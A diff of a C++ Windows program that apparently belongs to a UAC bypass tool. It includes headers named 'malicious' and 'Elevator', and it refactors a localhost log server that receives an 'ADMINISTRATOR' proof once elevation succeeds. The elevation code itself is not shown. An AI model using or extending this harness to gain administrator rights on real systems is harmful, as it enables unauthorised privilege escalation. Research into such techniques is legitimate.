@@ -1,13 +1,17 @@
 #include <common/Log.hpp>
-#include <malicious/BinaryRessource.hpp>
+#include <common/LogServer.hpp>
+using namespace Common;
+
 #include <system/ThisProcess.hpp>
 #include <system/System.hpp>
 #include <system/Process.hpp>
 #include <system/ProcessManager.hpp>
 #include <system/File.hpp>
 #include <system/Uac.hpp>
-#include <blaspheme/Blaspheme.hpp>
 using namespace System;
+
+#include <malicious/BinaryRessource.hpp>
+#include <blaspheme/Blaspheme.hpp>
 using namespace Malicious;
 
 #include <string>
@@ -19,37 +23,17 @@ using namespace std;
 #include <Elevator32.hpp>
 #include <Elevator64.hpp>
 
-DWORD WINAPI MsgLoop(LPVOID lpParameter)
-{
-	Network::UdpSocket server;
-	server.listen(8000);
-	Network::Timeout deadline(0, 100);
-	std::string buffer;
-	while(true)
-	{
-		server.recv(buffer, deadline);
-		if(buffer.size())
-		{
-			LOG << buffer;
-			if(buffer == "ADMINISTRATOR")
-			{
-				exit(EXIT_SUCCESS);
-			}
-		}
-	}
-	return EXIT_FAILURE;
-}
-
 int main()
 {
 	try
 	{
-		DWORD dwThread = EXIT_FAILURE;
-		HANDLE hThread = 0;
+		LOG.trace();
+		Network::Port port = 8000;
+		LogServer logServer(port, "ADMINISTRATOR");
 		if(isAdministrator())
 		{
 			LOG.setHeader("FROM ELEVATED PROCESS");
-			LOG.addObserver(new Common::LogToNetwork("127.0.0.1", 8000));
+			LOG.addObserver(new Common::LogToNetwork("127.0.0.1", port));
 			LOG.sendRaw("ADMINISTRATOR");
 			return EXIT_SUCCESS;
 		}
@@ -59,7 +43,7 @@ int main()
 			LOG.addObserver(new Common::LogToNetwork("127.0.0.1", 80));
 			LOG.addObserver(new Common::LogToConsole);
 			LOG << "Vous n'etes pas administrateur !";
-			hThread = CreateThread(0, 0,(LPTHREAD_START_ROUTINE)MsgLoop, 0, 0, &dwThread);
+			logServer.start();
 		}
 
         switch(getSystemVersion())
@@ -119,12 +103,12 @@ int main()
 				LOG << "Systeme non pris en charge...";
 				return EXIT_FAILURE;
         }
-
-		if(hThread != 0 && !TerminateThread(hThread, 0))
+		logServer.stop();
+		if(logServer.isProofReceived())
 		{
-			LOG << "Echec TerminateThread : " + to_string(GetLastError());
+			LOG << "Log server well interrupted";
+			return EXIT_SUCCESS;
 		}
-		return dwThread;
     }
     catch(std::exception& e)
     {
@@ -132,7 +116,7 @@ int main()
     }
 	catch(...)
 	{
-		LOG << "Erreur d'origine inconnue.";
+		LOG << "Unknow exception.";
 	}
 	return EXIT_FAILURE;
 }
